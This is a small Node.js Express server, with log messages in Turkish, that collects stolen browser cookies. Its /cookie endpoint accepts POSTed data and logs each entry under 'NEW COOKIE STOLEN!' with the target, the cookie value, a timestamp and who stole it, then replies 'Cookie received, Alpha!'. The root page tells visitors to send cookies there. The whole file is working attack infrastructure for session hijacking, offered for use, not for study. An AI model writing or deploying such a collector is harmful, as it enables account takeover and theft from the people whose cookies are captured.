const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

app.post('/cookie', (req, res) => {
    const data = req.body;
    console.log('\n🔥 YENİ COOKIE ÇALINDI! 🔥');
    console.log('👤 Hedef:', data.target);
    console.log('🍪 Cookie:', data.cookie);
    console.log('⏰ Zaman:', new Date(data.timestamp * 1000).toLocaleString());
    console.log('🤖 Çalan:', data.stolenBy);
    console.log('----------------------------------------\n');
    res.status(200).send('Cookie alındı, Alpha!');
});

app.get('/', (req, res) => {
    res.send('Zeta Sunucusu çalışıyor. POST /cookie adresine cookie gönder.');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Zeta Sunucusu çalışıyor: http://localhost:${PORT}`);
});
